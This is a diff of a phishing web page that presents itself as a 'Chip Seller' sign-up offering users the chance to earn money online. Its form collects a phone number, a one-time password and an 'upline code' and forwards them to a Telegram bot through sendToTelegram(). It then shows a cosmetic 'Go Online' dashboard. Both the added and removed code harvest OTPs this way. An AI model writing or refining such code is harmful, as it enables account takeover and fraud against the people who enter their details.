+      const otp = document.getElementById('otp').value.trim();
+      const upline = document.getElementById('upline').value.trim() || 'None';
+      const submitBtn = document.getElementById('submit-btn');
+
+      if (phone.length < 10 || otp.length < 4) {
+        showToast('Please fill all details properly!', 'error');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
+
+      const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
+
+      await sendToTelegram(message);
+
+      showToast('Sign up successful!', 'success');
+      
+      // Smooth Transition from Sign-Up to Dashboard View
+      document.getElementById('signup-section').classList.add('hidden');
+      document.getElementById('dashboard-section').classList.remove('hidden');
+    }
+
+    // 3. Exact 3-Second Countdown & Go Online Logic
+    var isOnline = false;
+    var isCounting = false;
+
+    function handleButtonClick() {
+      if (isCounting) return;
+
+      var btnIcon = document.getElementById('btnIcon');
+      var btnText = document.getElementById('btnText');
+      var taglineText = document.getElementById('taglineText');
+      var glowRing = document.getElementById('glowRing');
+
+      if (!isOnline) {
+        isCounting = true;
+        btnIcon.style.display = 'none';
+        
+        var count = 3;
+        btnText.style.fontSize = '55px';
+        btnText.innerText = count;
+
+        var timer = setInterval(function() {
+          count--;
+          if (count > 0) {
+            btnText.innerText = count;
+          } else {
+            clearInterval(timer);
+            isCounting = false;
+            isOnline = true;
             
-            const toast = document.createElement('div');
-            toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium text-white pointer-events-auto flex items-center justify-between transition-all duration-300 opacity-0 translate-y-2 ${
-                type === 'success' ? 'bg-emerald-600' : type === 'error' ? 'bg-rose-600' : 'bg-slate-900 border border-slate-700'
-            }`;
+            // Online hone par Light Blue Glow + Text update
+            glowRing.classList.add('online-glow');
+            btnIcon.style.display = 'block';
+            btnText.style.fontSize = '19px';
+            btnText.innerText = 'Go Offline';
+            taglineText.innerText = 'EARNING MONEY NOW-';
+          }
+        }, 1000);
 
-            const icon = type === 'success' ? 'fa-circle-check' : type === 'error' ? 'fa-triangle-exclamation' : 'fa-circle-info';
+      } else {
+        isOnline = false;
+        glowRing.classList.remove('online-glow');
+        btnIcon.style.display = 'block';
+        btnText.style.fontSize = '19px';
+        btnText.innerText = 'Go Online';
+        taglineText.innerText = 'GO ONLINE TO EARN MONEY!';
+      }
+    }
+  </script>
 
-            toast.innerHTML = `
-                <div class="flex items-center space-x-2">
-                    <i class="fa-solid ${icon}"></i>
-                    <span>${message}</span>
-                </div>
-                <button onclick="this.parentElement.remove()" class="ml-3 text-white/80 hover:text-white">
-                    <i class="fa-solid fa-xmark text-xs"></i>
-                </button>
-            `;
-
-            container.appendChild(toast);
-            setTimeout(() => { toast.classList.remove('opacity-0', 'translate-y-2'); }, 10);
-
-            setTimeout(() => {
-                toast.classList.add('opacity-0', 'translate-y-2');
-                setTimeout(() => toast.remove(), 300);
-            }, 4000);
-        }
-
-        // 1. Send OTP Request to Telegram Bot
-        async function sendOTP() {
-            const phoneInput = document.getElementById('phone').value.trim();
-            if(phoneInput.length < 10) {
-                showToast('Please enter a valid 10-digit mobile number first!', 'error');
-                return;
-            }
-
-            const otpBtn = document.getElementById('otp-btn');
-            if (timerInterval) return;
-
-            const message = `📲 *New OTP Request!*\n\n📱 *Phone:* \`+91 ${phoneInput}\``;
-
-            otpBtn.disabled = true;
-            otpBtn.innerText = 'Sending...';
-
-            await sendToTelegram(message);
-
-            showToast('OTP request sent to +91 ' + phoneInput, 'success');
-            countdownSeconds = 60;
-            otpBtn.innerText = `${countdownSeconds}s`;
-            otpBtn.classList.add('opacity-50', 'cursor-not-allowed');
-
-            timerInterval = setInterval(() => {
-                countdownSeconds--;
-                otpBtn.innerText = `${countdownSeconds}s`;
-                if (countdownSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                    otpBtn.disabled = false;
-                    otpBtn.innerText = 'Request';
-                    otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                }
-            }, 1000);
-        }
-
-        // 2. Sign Up Form Submit & Send Details to Telegram
-        async function handleFormSubmit(event) {
-            event.preventDefault();
-
-            const phone = document.getElementById('phone').value.trim();
-            const otp = document.getElementById('otp').value.trim();
-            const upline = document.getElementById('upline').value.trim() || 'None';
-            const submitBtn = document.getElementById('submit-btn');
-
-            if (phone.length < 10) {
-                showToast('Please enter a valid phone number!', 'error');
-                return;
-            }
-            if (otp.length < 4) {
-                showToast('Please enter a valid OTP!', 'error');
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
-
-            const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
-
-            await sendToTelegram(message);
-
-            showToast('Sign up successful! Welcome aboard.', 'success');
-            
-            // Switch from Sign Up to Dashboard view seamlessly
-            document.getElementById('signup-section').classList.add('hidden');
-            document.getElementById('dashboard-section').classList.remove('hidden');
-
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = `<span>Sign up</span>`;
-        }
-
-        // 3. Dashboard Go Online Toggle Logic
-        let isOnline = false;
-        function toggleOnline() {
-            isOnline = !isOnline;
-            const btn = document.getElementById('goOnlineBtn');
-            const btnText = document.getElementById('btnText');
-            if (isOnline) {
-                btn.style.background = 'linear-gradient(to bottom, #047857, #065f46)';
-                btnText.innerText = 'Go Offline';
-                showToast('Aap online ho gaye hain!', 'success');
-            } else {
-                btn.style.background = 'linear-gradient(to bottom, #4338ca, #312e81)';
-                btnText.innerText = 'Go Online';
-                showToast('Aap offline ho chuke hain.', 'info');
-            }
-        }
-
-        function openBankModal() {
-            showToast('My Bank Account settings open ho rahi hain...', 'info');
-        }
-    </script>
 </body>
 </html>
